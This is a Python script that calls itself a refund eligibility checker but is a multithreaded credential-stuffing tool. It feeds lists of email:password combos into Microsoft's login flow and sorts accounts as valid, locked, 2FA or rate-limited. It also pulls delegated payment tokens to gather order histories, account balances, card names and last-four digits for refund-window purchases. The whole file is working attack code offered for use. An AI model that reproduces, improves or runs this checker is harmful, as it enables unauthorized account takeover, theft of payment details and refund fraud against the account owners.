"""
Microsoft Refund Eligibility Checker
Logs into Microsoft accounts, fetches order/purchase history,
and checks if any digital games or subscriptions are within the
14-day refund window.
"""

import requests
import urllib.parse
import time
import threading
import re
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor, as_completed

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"

REFUND_WINDOW_DAYS = 14

MAX_RETRIES = 3
RETRY_DELAY = 2

AUTHORIZE_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=0000000048170EF2"
    "&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf"
    "&response_type=token"
    "&scope=service%3A%3Aoutlook.office.com%3A%3AMBI_SSL"
    "&display=touch"
)

COMMON_HEADERS = {
    "User-Agent": USER_AGENT,
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate",
}


def _parse_lr(text, left, right):
    try:
        start = text.index(left) + len(left)
        end = text.index(right, start)
        return text[start:end]
    except (ValueError, IndexError):
        return ""


def _parse_lr_re(text, left, right):
    m = re.search(f'{re.escape(left)}(.*?){re.escape(right)}', text, re.DOTALL)
    return m.group(1) if m else ""


def _check_status(text, url, cookies_str):
    if any(x in text for x in [
        "Your account or password is incorrect",
        "That Microsoft account doesn\\'t exist",
        "That Microsoft account doesn't exist",
        "Sign in to your Microsoft account",
        "timed out"
    ]):
        return "FAILURE"
    if ",AC:null,urlFedConvertRename" in text:
        return "BAN"
    if any(x in text for x in [
        "account.live.com/recover?mkt", "recover?mkt",
        "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt"
    ]):
        return "2FACTOR"
    if "/cancel?mkt=" in text or "/Abuse?mkt=" in text:
        return "CUSTOM_LOCK"
    if ("ANON" in cookies_str or "WLSSC" in cookies_str) and \
       "https://login.live.com/oauth20_desktop.srf?" in url:
        return "SUCCESS"
    return "UNKNOWN_FAILURE"


def _is_within_refund_window(date_str):
    """Check if a date string is within the 14-day refund window."""
    for fmt in ("%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ",
                "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%fZ",
                "%Y-%m-%d"):
        try:
            dt = datetime.strptime(date_str.split("+")[0].split("Z")[0][:26], fmt)
            return (datetime.utcnow() - dt) <= timedelta(days=REFUND_WINDOW_DAYS), dt
        except ValueError:
            continue
    return False, None


def _check_single(email, password):
    """Check a single account for refund-eligible purchases."""
    for attempt in range(MAX_RETRIES):
        result = _attempt_check(email, password)
        if result["status"] == "retry":
            if attempt < MAX_RETRIES - 1:
                time.sleep(RETRY_DELAY * (attempt + 1))
                continue
            result["status"] = "fail"
            result["detail"] = f"retry exhausted ({result.get('detail', '')})"
        return result
    return result


def _attempt_check(email, password):
    result = {
        "user": email, "password": password,
        "status": "fail", "captures": {}, "detail": "",
        "refundable": []
    }

    session = requests.Session()
    session.max_redirects = 8
    session.headers.update(COMMON_HEADERS)

    try:
        # ── Step 1: GET login page for fresh PPFT ──
        r0 = session.get(AUTHORIZE_URL, allow_redirects=True, timeout=15)
        page = r0.text

        ppft = _parse_lr(page, 'name="PPFT" id="i0327" value="', '"')
        if not ppft:
            ppft = _parse_lr_re(page, "sFT:'", "'")
        if not ppft:
            result["detail"] = "PPFT not found"
            return result

        url_post = _parse_lr_re(page, "urlPost:'", "'")
        if not url_post:
            url_post = _parse_lr_re(page, 'urlPost:"', '"')
        if not url_post:
            result["detail"] = "urlPost not found"
            return result

        # ── Step 2: POST login ──
        data = (
            f"ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={urllib.parse.quote(ppft)}"
            f"&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0"
            f"&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=1"
            f"&login={urllib.parse.quote(email)}&loginfmt={urllib.parse.quote(email)}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit="
            f"&passwd={urllib.parse.quote(password)}"
        )

        post_headers = {
            "Host": "login.live.com", "Connection": "keep-alive",
            "Cache-Control": "max-age=0", "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
            "Referer": r0.url, "Upgrade-Insecure-Requests": "1",
        }

        r1 = session.post(url_post, headers=post_headers, data=data,
                          allow_redirects=True, timeout=15)

        cookies_str = str(session.cookies.get_dict())
        status = _check_status(r1.text, r1.url, cookies_str)

        if status != "SUCCESS":
            labels = {
                "FAILURE": ("fail", "Invalid Credentials"),
                "UNKNOWN_FAILURE": ("fail", "Unknown Failure"),
                "BAN": ("retry", "Rate limited"),
                "2FACTOR": ("locked", "2FA/Verify"),
                "CUSTOM_LOCK": ("locked", "Custom Lock"),
            }
            s, d = labels.get(status, ("fail", status))
            result["status"] = s
            result["detail"] = d
            return result

        # ── Step 3: Get PIFD token ──
        pifd_token = ""
        try:
            r2 = session.get(
                "https://login.live.com/oauth20_authorize.srf?"
                "client_id=000000000004773A&response_type=token"
                "&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete"
                "&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth"
                "&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D"
                "&prompt=none",
                headers={
                    "Host": "login.live.com",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Connection": "close",
                    "Referer": "https://account.microsoft.com/",
                },
                allow_redirects=True, timeout=15,
            )
            pifd_token = _parse_lr(str(r2.url), "access_token=", "&token_type")
            if not pifd_token:
                pifd_token = _parse_lr(str(r2.url), "access_token=", "&")
            if pifd_token:
                pifd_token = urllib.parse.unquote(pifd_token)
        except Exception:
            pass

        if not pifd_token:
            result["status"] = "fail"
            result["detail"] = "Token failed"
            return result

        pay_headers = {
            "User-Agent": USER_AGENT,
            "Pragma": "no-cache",
            "Accept": "application/json",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": f'MSADELEGATE1.0="{pifd_token}"',
            "Content-Type": "application/json",
            "Origin": "https://account.microsoft.com",
            "Referer": "https://account.microsoft.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-site",
        }

        # ── Step 4: Fetch order history / transactions ──
        refundable_items = []

        # Method 1: Payment transactions (subscriptions + purchases)
        try:
            tx_resp = session.get(
                "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions",
                headers=pay_headers, timeout=15,
            )
            tx_body = tx_resp.text

            try:
                tx_json = tx_resp.json()
            except Exception:
                tx_json = {}

            # Parse subscriptions
            if isinstance(tx_json, dict):
                subs = tx_json.get("subscriptions", tx_json.get("items", []))
                if isinstance(subs, list):
                    for sub in subs:
                        start = sub.get("startDate", sub.get("purchaseDate", ""))
                        title = sub.get("title", sub.get("description", "Subscription"))
                        amount = sub.get("totalAmount", sub.get("amount", ""))
                        currency = sub.get("currency", "")
                        auto_renew = sub.get("autoRenew", None)

                        if start:
                            eligible, dt = _is_within_refund_window(start)
                            if eligible and dt:
                                refundable_items.append({
                                    "title": title,
                                    "date": dt.strftime("%Y-%m-%d"),
                                    "type": "Subscription",
                                    "amount": f"{amount} {currency}".strip(),
                                    "auto_renew": auto_renew,
                                    "days_ago": (datetime.utcnow() - dt).days,
                                })

            # Fallback: parse raw text for dates
            if not refundable_items:
                # Look for startDate or purchaseDate patterns
                dates_found = re.findall(
                    r'"(?:startDate|purchaseDate|orderDate|transactionDate)"\s*:\s*"([^"]+)"',
                    tx_body
                )
                titles_found = re.findall(r'"title"\s*:\s*"([^"]+)"', tx_body)
                amounts_found = re.findall(r'"totalAmount"\s*:\s*([0-9.]+)', tx_body)

                for i, date_str in enumerate(dates_found):
                    eligible, dt = _is_within_refund_window(date_str)
                    if eligible and dt:
                        refundable_items.append({
                            "title": titles_found[i] if i < len(titles_found) else "Unknown",
                            "date": dt.strftime("%Y-%m-%d"),
                            "type": "Purchase",
                            "amount": amounts_found[i] if i < len(amounts_found) else "N/A",
                            "days_ago": (datetime.utcnow() - dt).days,
                        })

        except Exception:
            pass

        # Method 2: Order history endpoint
        try:
            orders_resp = session.get(
                "https://purchase.mp.microsoft.com/v7.0/users/me/orders?"
                "market=US&language=en-US&lineItemStates=All&count=50&orderBy=Date",
                headers=pay_headers, timeout=15,
            )

            try:
                orders_json = orders_resp.json()
            except Exception:
                orders_json = {}

            orders_list = orders_json.get("items", orders_json.get("orders", []))
            if isinstance(orders_list, list):
                for order in orders_list:
                    order_date = order.get("orderDate", order.get("creationDate", order.get("purchaseDate", "")))
                    if not order_date:
                        continue

                    eligible, dt = _is_within_refund_window(order_date)
                    if not eligible or not dt:
                        continue

                    # Check line items
                    line_items = order.get("lineItems", order.get("items", [order]))
                    for item in (line_items if isinstance(line_items, list) else [line_items]):
                        title = (item.get("productTitle", "") or
                                 item.get("title", "") or
                                 item.get("name", "") or
                                 item.get("description", "Unknown Item"))
                        amount = item.get("amount", item.get("totalPrice", item.get("listPrice", "")))
                        currency = item.get("currencyCode", item.get("currency", ""))
                        product_type = item.get("productType", item.get("type", "Digital"))
                        refund_state = item.get("refundState", item.get("refundEligibility", ""))

                        # Skip already refunded
                        if isinstance(refund_state, str) and "refunded" in refund_state.lower():
                            continue

                        # Avoid duplicates
                        if any(r["title"] == title and r["date"] == dt.strftime("%Y-%m-%d")
                               for r in refundable_items):
                            continue

                        refundable_items.append({
                            "title": title,
                            "date": dt.strftime("%Y-%m-%d"),
                            "type": product_type,
                            "amount": f"{amount} {currency}".strip() if amount else "N/A",
                            "days_ago": (datetime.utcnow() - dt).days,
                        })

        except Exception:
            pass

        # Method 3: Commerce purchase history
        try:
            purchase_resp = session.get(
                "https://purchase.mp.microsoft.com/v8.0/b2b/orders/search?"
                "beneficiary=me&market=US&ordersState=All&pgSize=25",
                headers=pay_headers, timeout=15,
            )

            try:
                purchase_json = purchase_resp.json()
            except Exception:
                purchase_json = {}

            items_list = purchase_json.get("items", purchase_json.get("orders", []))
            if isinstance(items_list, list):
                for item in items_list:
                    pdate = item.get("orderDate", item.get("creationDate", item.get("purchaseDate", "")))
                    if not pdate:
                        continue
                    eligible, dt = _is_within_refund_window(pdate)
                    if not eligible or not dt:
                        continue

                    title = (item.get("productTitle", "") or
                             item.get("title", "") or
                             item.get("productName", "Unknown"))
                    amount = item.get("totalPrice", item.get("amount", ""))
                    currency = item.get("currencyCode", "")

                    if any(r["title"] == title and r["date"] == dt.strftime("%Y-%m-%d")
                           for r in refundable_items):
                        continue

                    refundable_items.append({
                        "title": title,
                        "date": dt.strftime("%Y-%m-%d"),
                        "type": item.get("productType", "Digital"),
                        "amount": f"{amount} {currency}".strip() if amount else "N/A",
                        "days_ago": (datetime.utcnow() - dt).days,
                    })

        except Exception:
            pass

        # ── Step 5: Payment info capture ──
        try:
            pay_resp = session.get(
                "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx"
                "?status=active,removed&language=en-US",
                headers=pay_headers, timeout=15,
            )
            pay_body = pay_resp.text

            balance = _parse_lr(pay_body, 'balance":', ',"') or "N/A"
            cc_name = _parse_lr(pay_body, 'paymentMethodFamily":"credit_card","display":{"name":"', '"')
            last4 = _parse_lr(pay_body, 'lastFourDigits":"', '",')
            country_code = _parse_lr(pay_body, '"country":"', '"')

            if balance and balance != "N/A":
                result["captures"]["Balance"] = f"${balance}"
            if cc_name or last4:
                result["captures"]["Payment"] = f"{cc_name} ****{last4}".strip()
            if country_code:
                result["captures"]["Country"] = country_code

        except Exception:
            pass

        # ── Build result ──
        result["refundable"] = refundable_items

        if refundable_items:
            result["status"] = "hit"
            items_summary = []
            for item in refundable_items[:5]:
                days = item.get("days_ago", "?")
                amt = item.get("amount", "N/A")
                items_summary.append(f"{item['title']} ({days}d ago, {amt})")
            result["captures"]["Refundable"] = " | ".join(items_summary)
            result["captures"]["Total Refundable"] = str(len(refundable_items))
        else:
            result["status"] = "free"
            result["captures"]["Refundable"] = "None found"

        return result

    except requests.exceptions.Timeout:
        result["status"] = "retry"
        result["detail"] = "timed out"
    except requests.exceptions.ConnectionError:
        result["status"] = "retry"
        result["detail"] = "connection error"
    except Exception as ex:
        result["status"] = "fail"
        result["detail"] = str(ex)[:100]

    return result


def check_refund_accounts(accounts, max_threads=10, on_progress=None, stop_event=None):
    """
    Check a list of email:pass combos for refund-eligible purchases.
    Returns list of result dicts.
    """
    results = []
    done = [0]
    total = len(accounts)
    lock = threading.Lock()

    def worker(combo):
        if stop_event and stop_event.is_set():
            return {
                "user": combo.split(":", 1)[0] if ":" in combo else combo,
                "password": combo.split(":", 1)[1] if ":" in combo else "",
                "status": "fail", "captures": {}, "detail": "stopped",
                "refundable": [],
            }
        parts = combo.split(":", 1)
        if len(parts) != 2 or not parts[0].strip() or not parts[1].strip():
            return {
                "user": parts[0].strip() if parts else combo,
                "password": parts[1].strip() if len(parts) > 1 else "",
                "status": "fail", "captures": {}, "detail": "invalid format",
                "refundable": [],
            }
        email, password = parts[0].strip(), parts[1].strip()
        r = _check_single(email, password)
        with lock:
            done[0] += 1
            if on_progress:
                try:
                    on_progress(done[0], total, r.get("status", "fail"))
                except TypeError:
                    on_progress(done[0], total)
        return r

    with ThreadPoolExecutor(max_workers=max_threads) as pool:
        futures = {pool.submit(worker, acc): acc for acc in accounts}
        for f in as_completed(futures):
            try:
                r = f.result()
                if r:
                    results.append(r)
            except Exception as ex:
                acc = futures[f]
                results.append({
                    "user": acc.split(":", 1)[0] if ":" in acc else acc,
                    "password": acc.split(":", 1)[1] if ":" in acc else "",
                    "status": "fail", "captures": {},
                    "detail": f"thread error: {str(ex)[:60]}",
                    "refundable": [],
                })

    return results
